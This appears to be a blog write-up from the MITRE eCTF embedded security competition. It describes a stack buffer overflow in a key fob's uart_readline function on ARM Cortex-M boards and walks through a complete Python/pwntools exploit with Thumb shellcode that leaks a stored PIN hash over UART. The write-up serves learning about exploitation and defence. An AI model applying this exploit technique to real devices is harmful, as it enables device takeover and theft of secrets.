+++
title = "Exploiting buffer overflows on embedded ARM devices"
date = 2023-05-07
[extra]
+++


# Table of Contents

1.  [Summary](#org31990d5)
    1.  [Key takeaways](#org0b0877e)
2.  [Background](#orge7242d3)
    1.  [eCTF competition](#org3dd1f34)
    2.  [The Vulnerability](#org1b93daa)
3.  [Exploitation](#org8cd9cd4)
    1.  [An ARM primer](#orgd8abfd7)
    2.  [Buffer overflow](#org20fefb2)
    3.  [Full exploit code](#org09804bb)



<a id="org31990d5"></a>

# Summary

This year, I participated in eCTF, an embedded hacking competition. Our team found a buffer overflow vulnerability and exploited it by writing ARM thumb shellcode to exfiltrate key data. This article is intended for those with experience in exploiting x86 Linux programs, but no ARM experience is required.


<a id="org0b0877e"></a>

## Key takeaways

-   Buffer overflows are critical, especially in embedded systems that lack common protections like stack canaries.
-   Set the LSB of the branching address (and use `bx` or `blx`) when branching to Thumb mode code. Thumb code is often much shorter, making it easier to craft shellcode to fit a certain size requirement.
-   The lack of stack randomization makes it easy to perform simple attacks, such as overwriting the return address and jumping to shellcode in the overflowed buffer.


<a id="orge7242d3"></a>

# Background


<a id="org3dd1f34"></a>

## eCTF competition

I lead our UIUC&rsquo;s school team this year as we participated in eCTF, an embedded hacking competition organized by MITRE. The competition is split into two parts: a design phase and an attack phase. During the design phase, teams develop a secure communication design between a key fob and car, which is modeled using Tiva ARM development boards. The communication happens over a wired UART connection. In the attack phase, teams attack each others designs, looking for vulnerabilities to exploit.

Teams had to build a secure design that still met the functionality requirements. These include being able to unlock a car with a paired keyfob, being able to pair new keyfobs, and being able to enable software-defined &ldquo;features&rdquo; for cars. There are several security requirements, one of which was that you cannot pair new fobs without the PIN.

The organizers provided an insecure example for the teams to build off of. Some teams opted to write their design entirely from scratch, while others chose to modify this insecure example. The insecure example contained many small bugs, which many teams failed to notice. This meant that many of the teams all had similar vulnerabilities.


<a id="org1b93daa"></a>

## The Vulnerability

One common vulnerability across many teams is an input function similar `gets`: it reads in a potentially unlimited sized buffer, which may lead to a buffer overflow. This function, called `uart_readline`, reads in to a buffer from a chosen UART port. In the sample code shown below, a team called this function in the `enableFeature` function, which is responsible for enabling new features on a car/fob pair.

    void enableFeature(FOB_DATA *fob_state_ram)
    {
      // (code shortened for brevity) ...
      uint8_t uart_buffer[sizeof(ENABLE_PACKET)];
      uart_readline(HOST_UART, uart_buffer);
      // ...
    }

Looking at the definition of `uart_readline`, we see that it is indeed very similar to `gets`:

    /**
     * @brief Read a line (terminated with '\n') from a UART interface.
     *
     * @param uart is the base address of the UART port to read from.
     * @param buf is a pointer to the destination for the received data.
     * @return the number of bytes read from the UART interface.
     */
    uint32_t uart_readline(uint32_t uart, uint8_t *buf) {
      uint32_t read = 0;
      uint8_t c;
    
      do {
        c = (uint8_t)uart_readb(uart);
    
        if ((c != '\r') && (c != '\n') && (c != 0xD)) {
          buf[read] = c;
          read++;
        }
      } while ((c != '\n') && (c != 0xD));
    
      buf[read] = '\0';
    
      return read;
    }

The important part to focus on is that the loop keeps reading in new bytes with `uart_readb` as long as the byte is `(c != '\n') && (c != 0xD)` (newline and carriage return) characters.

Note that the `uart_readline` function was written by the organizers and provided in the insecure example.


<a id="org8cd9cd4"></a>

# Exploitation


<a id="orgd8abfd7"></a>

## An ARM primer

Before we get into the exploit, let&rsquo;s first have a primer on the ARM architecture, with particular emphasis to the elements needed for executing the exploit. We will focus on the ARM32 instruction set for the Cortex-M series of chips because that is what this competition used. ARM32 is a RISC (reduced instruction set architecture).

There are [16 registers](https://developer.arm.com/documentation/dui0473/m/overview-of-the-arm-architecture/arm-registers), grouped into 13 general purpose registers (`r0-r12`) and the stack pointer (`sp`), link register (`lr`), and program counter (`pc`). The link register is used to store the return address. It is saved on the stack when the function itself needs to call another function.

Each instruction is 32 bits long. To improve instruction density, ARM introduced the [Thumb](https://developer.arm.com/documentation/dui0473/m/overview-of-the-arm-architecture/arm--thumb--and-thumbee-instruction-sets) (and later Thumb-2) instruction sets. In Thumb-2 mode, some common instructions are 16 bits while others are 32 bits long. To [switch](https://developer.arm.com/documentation/dui0473/m/overview-of-the-arm-architecture/changing-between-arm--thumb--and-thumbee-state) between the 16 and 32-bit execution modes, use [`bx`](https://developer.arm.com/documentation/dui0489/i/arm-and-thumb-instructions/bx) (&ldquo;Branch and Exchange&rdquo;) and `blx`  (&ldquo;Branch with Link and Exchange&rdquo;). Note that the LSB (least significant bit) of the address must be `1` to force thumb mode and `0` otherwise. It is important to pay attention to this, as there is no analogue in x86 programming. If the CPU attempts to execute a Thumb instruction while not in Thumb mode, it would generate an instruction decoding fault (or, in the worst case, misinterpret the instruction as something entirely different). You can set thumb mode with `.thumb` or `.code 16` when writing assembly with the GNU assembler.

When loading large literals into a register, the assembler may place it in the program memory next to the instruction in a space called the &ldquo;literal pool&rdquo;. This is because each ARM32 instruction is 32-bits long, so a 32-bit literal cannot fit in it. As a result, there may be what appears to be &ldquo;junk&rdquo; after a series of instructions.

For example, if we wanted to move the constant `0x12345678` into register `r0`, we can use the instruction `ldr`: `ldr r0, =0x12345678`. The `mov` instruction has a limit on the size of the literal it can move, but `ldr` will store the literal in a literal pool if it is too large. This gets assembled into the following in Thumb mode (GNU ARM binutils 2.31.1, [Godbolt link](https://godbolt.org/z/5xvMbEPWc)).

    .text:
    0x00000000      4800           ldr r0, [pc, #0]
    0x00000002      0000
    0x00000004      0x12345678

The `ldr` instruction loads the constant from program memory. The literal pool is aligned to 4 bytes, which explains the two null bytes after the `ldr`. In Thumb mode, the pc-relative instructions always use the current instruction pointer + 4, which is why the offset is 0.


<a id="org20fefb2"></a>

## Buffer overflow

Generally, buffer overflows on the stack allows an attack to control the return address, which is usually stored on the stack. I say usually because on ARM systems, the return address is actually stored in the link register (`lr`). In a leaf function (a function which calls no other functions), the compiler recognizes that it does not need to store this register on the stack. Non-leaf functions do need to save `lr` on the stack since the functions it calls may clobber (modify) it.

In our case, `enableFob` calls many other functions, and thus stores the return address on the stack. This is great news for us, because it means that a buffer overflow will be able to overwrite the return address and run arbitrary code on the device. For this particular team, we chose to exfiltrate the PIN, which can be used to pair new fobs. This PIN is also stored in RAM on the device, so we need to be careful not to overwrite it while overflowing the buffer.

So we know we can overwrite the return address. But how far do we overflow the buffer? To answer that, let&rsquo;s consult the assembly. The following is the beginning and end of the `enableFeature` function.

              enableFeature:
    0x0000b058      2de9f041       push.w {r4, r5, r6, r7, r8, lr}  (1)
    0x0000b05c      adf50c7d       sub.w sp, sp, 0x230              (2)
    0x0000b060      4ff0ff33       mov.w r3, -1
    0x0000b064      0393           str r3, [sp, 0xc]
    0x0000b066      0378           ldrb r3, [r0]
    0x0000b068      0446           mov r4, r0
    0x0000b06a      002b           cmp r3, 0
    0x0000b06c      40f08380       bne.w 0xb176
    0x0000b070      69a9           add r1, sp, 0x1a4                (3)
    0x0000b072      4848           ldr r0, [0x0000b194]
    0x0000b074      fff788fe       bl sym.uart_readline             (4)

    0x0000b176      0df50c7d       add.w sp, sp, 0x230
    0x0000b17a      bde8f081       pop.w {r4, r5, r6, r7, r8, pc}

Here&rsquo;s what the stack looks like relative to the stack pointer after `0x0000b05c` (2):

    $sp+0x0     local variables...
    $sp+0x1a4   uart_buffer
    $sp+0x230   r4, r5, r6, r7, r8
    $sp+0x244   return address

The function prologue (1) saves registers, including the `LR`, which stores the return address. Then, it subtracts 0x230 from the stack pointer (2) to create room for local variables. We pass `sp + 0x1a4` to the `uart_readline` function. This is where our input will be written to. Therefore, to overflow the return address, we need to send `0x230 - 0x1a4` bytes to UART. Then, we have to write another `4 * 5` bytes to overwrite the 5 saved registers. Since there is no stack layout randomization, we can send our return address, which always at the same address (we can get this address by testing locally with a debugger). Additionally, there is no stack canary to worry about, which makes the exploit much simpler.

The goal of this example is to exfiltrate the PIN hash, which is also stored on the stack. We can write some shellcode to accomplish this. This simple shellcode calls the an existing function `uart_write`, which can write arbitrary data to the host computer (which we can monitor).

    .thumb
        ldr r0, =0x4000c000 // HOST_UART
        ldr r1, =0x200020c9 // pin hash
        mov r2, #64
        ldr r3, =0xadb3     // uart_write
        blx r3

Since this is in thumb mode, we have to remember to set the LSB of the return address to 1.


<a id="org09804bb"></a>

## Full exploit code

Putting this together, we get the full exploit as shown below

    #!/usr/bin/env python3 -u
    
    from pwn import *
    import serial
    import os
    from time import sleep
    
    
    context.log_level = 'error'
    context.arch = 'arm'
    context.endian = 'little'
    context.bits = 32
    
    
    def open_serial():
        # find the first serial port and open it
        try:
            port = os.popen('ls /dev/tty.usb*').read().split()[0]
            print('port', port)
        except IndexError:
            print('No serial port found')
            return
    
        ser = serial.Serial(port, 115200, timeout=0)
        print('\nNew serial port opened: ' + port)
        return ser
    
    
    def slow_write(ser, data):
        """
        Send data in chunks of 16 bytes
    
        This is necessary because the UART buffer is only 16 bytes long, so if we
        send more than that, we may lose data.
        """
        while len(data) > 0:
            ser.write(data[:16])
            data = data[16:]
            sleep(0.1)
    
    
    def main(feature_file, car_id):
        ser = open_serial()
    
        sleep(0.1)
    
        # tell the fob to enter enable feature mode
        ser.write(b'enable\n')
    
        sleep(0.5)
    
        # read feature file
        feat = open(feature_file, 'rb').read()
        # remove trailing newline
        feat = feat[:-1]
    
        # call uart_write to exfiltrate the PIN hash
        shellcode = asm('''
        .thumb
        ldr r0, =0x4000c000 // HOST_UART
        ldr r1, =0x200020c9 // pin hash
        mov r2, #64
        ldr r3, =0xadb3     // uart_write
        blx r3
        ''')
        print('shellcode', shellcode.hex())
    
        payload = b''
        payload += feat
        # uart_readline reads to buffer at sp + 0x1a4, there are 0x230 local
        # variables, so we need to pad the payload to length 0x230 - 0x1a4 = 0x8c
        payload += b'\x00' * (0x230 - 0x1a4 - len(feat))
        # now, we can control r4, r5, r6, r7, r8, and pc (instruction pointer!!)
        payload += p32(0xdeadbeef) # r4
        payload += p32(0xdeadbeef) # r5
        payload += p32(0xdeadbeef) # r6
        payload += p32(0xdeadbeef) # r7
        payload += p32(0xdeadbeef) # r8
        payload += p32(0x200020a1) # pc (next stack address)
        # note that the return address is odd to indicate thumb mode
    
        # now we can write the shellcode to the stack
        payload += shellcode
    
        # make sure there are no newlines or carriage returns in the payload
        if payload.find(b'\r') != -1 or payload.find(b'\n') != -1:
            print('ERROR: payload has newline')
            return
    
        slow_write(ser, payload + b'\n')
    
    
    if __name__ == '__main__':
        feature_file = './car5_pin_extraction_and_enable_feature_flag/car_5_feature_1'
        feature_id = 5
    
        main(feature_file, feature_id)

